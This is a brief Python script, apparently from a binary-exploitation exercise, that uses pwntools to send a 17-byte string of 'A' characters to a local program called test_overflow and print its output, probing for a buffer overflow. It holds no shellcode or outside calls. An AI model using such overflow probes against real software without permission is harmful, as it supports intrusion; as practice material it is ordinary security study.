#!/usr/bin/env python

from pwn import *

binary_path = "./test_overflow"

def print_lines(io):
    info("printing io received lines")
    while True:
        try:
            line = io.recvline()
            success(line.decode())
        except EOFError:
            break

elf = ELF(binary_path)
payload = b"A" * 17
p = process(elf.path)
p.sendline(payload)
print_lines(p)
